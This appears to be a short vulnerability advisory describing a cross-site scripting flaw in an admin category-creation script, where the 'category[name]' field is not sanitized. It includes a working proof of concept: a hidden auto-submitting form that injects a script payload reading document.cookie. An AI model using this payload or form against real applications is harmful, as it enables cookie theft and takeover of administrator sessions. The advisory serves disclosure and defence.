Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the admin/create_new_category script to properly sanitize user-supplied input in "category[name]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/create_new_category" method="post"  name="main" >
<input type="hidden" name="category[id]" value="999" >
<input type="hidden" name="category[name]" value='mynewcat"><script>alert(document.cookie)</script>' />
<input type="hidden" name="commit" value="Create New Category!" >
</form>
<script>
document.main.submit();
</script>
